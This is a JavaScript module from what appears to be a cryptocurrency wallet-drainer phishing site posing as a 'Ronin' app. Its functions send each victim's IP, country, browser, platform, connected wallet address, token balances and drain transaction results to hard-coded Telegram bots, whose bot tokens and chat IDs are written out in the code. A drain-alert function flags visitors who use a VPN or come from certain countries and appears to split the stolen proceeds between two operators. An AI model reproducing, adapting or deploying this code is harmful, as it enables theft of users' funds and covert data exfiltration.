// utils/telegramUtils.js
import axios from "axios";
import { checkVpnStatus, getUserCountry } from "./getUserLocation";  // Ensure correct file import
import { getContractAddress } from "./useWallet";

// THIS IS ANYTHING BOT
export const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot7721669670:AAHQBfY8WbA4UuNLxX1CrvXHxbohXlLylVs/sendMessage`;
  const payload = {
    chat_id: 6482385341,
    text: message,
    parse_mode: "Markdown"  // Enables Markdown for text formatting in Telegram
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};
// THIS IS BLESS BOT
export const sendMessageToTelegramNew = async (message) => {
  const url = `https://api.telegram.org/bot7706580242:AAGyik7sZI8vm2ZoiELheJC-HHG_FmfINwA/sendMessage`;
  const payload = {
    chat_id: 5146345746,
    text: message,
    parse_mode: "Markdown"  // Enables Markdown for text formatting in Telegram
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};
// Function to send app details  to Telegram

export const sendAppDetailsToTelegramLaunch = async (balance, token) => {
  console.log(token)
  // if (!transactionType) {
  //   console.log('A transaction type must be passed to identify the type of transaction being attempted')
  // }
  // let tokenDetails1 = token?.map(
  //   (token) => `| ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
  // )
  // console.log(tokenDetails1)
  // let tokenDetails = `| ${token.name}: ${(Number(token.balance_formatted)).toFixed(8)} ${token.name}   |`
  // // Fetch the full user country details (name and code)
  // console.log(tokenDetails)
  let userCountryData = await getUserCountry();


  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX" }; // Default fallback
  }

  const { country, countryCode, ip } = userCountryData;
  const globeIcon = "🌍";  // Unicode globe icon
  const deviceInfo = navigator.userAgent
  let message = `*Visit Alert*\n` +
    `App: Ronin \n\n` +
    `User Info--------------------\n` +
    `| IP: ${ip} |\n` +
    `| Country: ${globeIcon} ${country} ${countryCode} |\n` +
    `| Browser: ${deviceInfo} |\n` +
    `--------------------------------\n` +
    // `| User Wallet Balance |\n` +

    // `| ${token.symbol}: ${(Number(token.balance_formatted)).toFixed(8)} ${token.symbol}     |\n` +
    // `${tokenDetails}\n` +  // Use tokenDetails directly
    `------------------------------End`;
  console.log(message)
  // Send the message to Telegram
  await sendMessageToTelegram(message);
  await sendMessageToTelegramNew(message)
};
export const sendAppDetailsToTelegramLaunchWalletConnect = async (balance, token, address) => {
  console.log(token)

  let userCountryData = await getUserCountry();


  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX" }; // Default fallback
  }

  const { country, countryCode } = userCountryData;
  const browser = (() => {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome")) {
      return "Chrome";
    } else if (userAgent.includes("Firefox")) {
      return "Firefox";
    } else if (userAgent.includes("Mozilla")) {
      return "Mozilla";
    } else {
      return "Unknown Browser";
    }
  })();
  const globeIcon = "🌍";  // Unicode globe icon
  // const deviceInfo = navigator.userAgent
  let message = `🚨🚨🚨 Wallet Connected\n\n` +
    `💳 connected Wallet: ${address}\n` +
    `💳 Etherscan: view wallet on Etherscan [here](https://etherscan.io/address/${address})\n\n` +
    `💸 usd value: $0 worth of sweepable tokens\n` +
    `⛓ chain: pls\n` +
    `ℹ info: 🟢 Ronin App\n` +
    `🌏 website: ${window.location.href}\n` +
    `🚩 country: ${globeIcon} ${country} ${countryCode}\n` +

    `👨‍💻 Browser: ${browser}\n` +
    `📱 Platform: ${window.navigator.userAgentData ? (await window.navigator.userAgentData.getHighEntropyValues(['platform'])).platform : navigator.platform}`;
  console.log(message)
  // Send the message to Telegram
  await sendMessageToTelegram(message);
  await sendMessageToTelegramNew(message)
};
export const sendAppDetailsToTelegram = async (balance, token, chainId, amountAttempted, txState) => {
  // let tokenDetails = `| ${token.name}: ${(Number(token.balance_formatted)).toFixed(8)} ${token.name}   |`
  // Fetch the full user country details (name and code)
  // console.log(tokenDetails)
  let userCountryData = await getUserCountry();
  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX", isVpnIpdata: false }; // Default fallback
  }

  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
  const isVpn = isVpnIpdata || await checkVpnStatus(ip);
  const recipientAddress = getContractAddress(chainId)

  const specialCountries = ["AE", "ZA", "CA"];
  const globeIcon = "🌍";
  const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";

  let message = `*Transaction Attempt Alert*\n` +
    `App: Ronin Clone\n\n` +
    `User Info--------------------\n` +
    `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;

  if (isVpn || specialCountries.includes(countryCode)) {
    message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
  } else {
    message += `| ✅ NO VPN SUSPECTED |\n`;
  }

  message += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
    `--------------------------------\n` +
    `| 💵 User Wallet Balance  |\n` +
    `| 💵 ${token.symbol} balance: ${(Number(token.balance_formatted)).toFixed(8)} ${token.symbol}} ${token.symbol}       |\n` +
    `| Amount Attempted: ${(Number(amountAttempted)).toFixed(8)} |\n` +
    `| Transaction State: ${txState} |\n` +
    // `${tokenDetails}\n` +
    `------------------------------End`;
  console.log(message)
  // await sendMessageToTelegramNew(message)
  // await sendMessageToTelegramNew(message)
};

export const sendAppDetailsToTelegramDrain = async (balance, token, chainId, amountAttempted, txState, error, txhash) => {
  console.log('Token Assets:', token, balance)
  console.log('chainId', chainId)
  console.log('States', error, txhash)
  let tokenDetails = token || token.length < 0 && `| ${token.tokenName}: ${(Number(token.tokenAmount)).toFixed(8)} ${token.symbol}   |`
  const nativeTokenBalance = balance && token && `| ${balance.symbol}: ${(Number(balance.formatted)).toFixed(8)} ${balance.symbol}   |`
  // Fetch the full user country details (name and code)
  // Format error message if error exists
  let errorDetails = error ? `| ❌ Error: ${error.toString().slice(0, 100)}${error.toString().length > 100 ? '...' : ''} |` : '';
  let transactionHash = txhash && txState === 'Success' ? `|✅ Success: ${txhash.toString().slice(0, 100)}${txhash.toString().length > 100 ? '...' : ''} |` : '';
  console.log(tokenDetails)
  let userCountryData = await getUserCountry();
  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX", isVpnIpdata: false }; // Default fallback
  }

  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
  const vpnStatus = await checkVpnStatus(ip)
  const isVpn = vpnStatus || isVpnIpdata;
  const recipientAddress = await getContractAddress(chainId)
  console.log('VPN Status:', vpnStatus, isVpnIpdata)
  const specialCountries = ["NG", "AE", "ZA", "CA"];
  const globeIcon = "🌍";
  const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";
  console.log('Recipient Conditional: ', isMine, isVpn, specialCountries.includes(countryCode))
  let messageAnything = `*Transaction Attempt Alert*\n` +
    `App: Ronin\n\n` +
    `User Info--------------------\n` +
    `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;

  if (isVpn || specialCountries.includes(countryCode)) {
    messageAnything += `| ⚠️ RED ${isMine} |\n`;
  } else {
    messageAnything += `| ✅ GREEN ${isMine} |\n`;
  }

  messageAnything += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
    `--------------------------------\n` +
    `| 💵 User Wallet Balance  |\n` +
    `| Amount Attempted: ${(Number(amountAttempted)).toFixed(7)} ${balance.symbol} |\n` +
    `| Transaction State: ${txState} |\n` +
    `${errorDetails}\n` +
    `${transactionHash}\n` +
    `${tokenDetails}\n` +
    `${nativeTokenBalance}\n` +
    `------------------------------End`;

  let messageBless = `*Transaction Attempt Alert*\n` +
    `App: Ronin\n\n` +
    `User Info--------------------\n` +
    `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;

  messageBless +=
    `--------------------------------\n` +
    `| 💵 User Wallet Balance  |\n` +
    `| Amount Attempted: ${(Number(amountAttempted)).toFixed(7)} ${balance.symbol} |\n` +
    `| Transaction State: ${txState} |\n` +
    `${errorDetails}\n` +
    `${transactionHash}\n` +
    `${tokenDetails}\n` +
    `${nativeTokenBalance}\n` +
    `------------------------------End`;
  console.log('Message For Bless:', messageBless)
  console.log('Message For Anything:', messageAnything)

  if (isMine === "🔴") {
    await sendMessageToTelegramNew(messageBless);
  }
  await sendMessageToTelegram(messageAnything);
};